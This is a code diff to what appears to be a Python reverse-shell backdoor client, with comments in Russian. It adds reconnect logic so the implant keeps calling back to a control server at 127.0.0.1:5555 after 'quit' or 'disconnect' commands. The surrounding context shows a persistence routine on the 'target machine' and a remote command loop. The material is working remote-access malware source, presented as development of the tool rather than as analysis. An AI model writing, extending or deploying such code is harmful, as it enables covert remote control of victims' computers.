@@ -94,21 +94,34 @@ def persist(reg_name, copy_name):
         reliable_send('[-] Error Creating Persistence With The Target Machine')
 
 # Не уверен восстанавливается ли подключение, если оно пропало
+QUIT = True
+DISCONNECT = False
 def connection():
+    global s
     ip = '127.0.0.1'
     port = 5555
     while True:
         time.sleep(5)
         try:
-            #print("Попытка подключения...\n")
-            # Адрес компа-управления
+            # Адрес сервера к котрому подключаемся
             s.connect((ip, port))
-            #print("Успешно...\n")
-            shell()
-            # Выход из 1 го While (shell)
-            s.close()
-            # Выход из текущего While (connection)
-            break
+            result = shell()
+            # Если сервер отпраил команду Выход,
+            # То выходим из цикла, 
+            # завершая этим работу приложения
+            if result == QUIT:
+                # Выход из 1 го While (shell)
+                s.close()
+                # Выход из текущего While (connection)
+                break
+            # Если сервер отправил команду Disconnect,
+            # То мы разрывам с ним соединение (удлаив сокет)
+            # При этом сразу же создаем новый, чтобы 
+            # восстановить поытки соединения после разъединения
+            elif result == DISCONNECT:
+                s.close()
+                time.sleep(20)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         except:
             # Если много будет спать,
             # то, возможно, будет много рекурсивых вызовов
@@ -131,11 +144,11 @@ def shell():
         command = reliable_recv()
         # Закрываем программу, если пришла команда quit
         if command == 'quit':
-            break
+            return True
+        elif command == 'disconnect':
+            return False
         # При получении следующей команды, мы не закроем программу на этой машине
         # Но это нам позволит перейти в Command Center на галвной машине
-        if command == 'back_to_center':
-            pass
         elif command == 'help':
             pass
         elif command == 'clear':
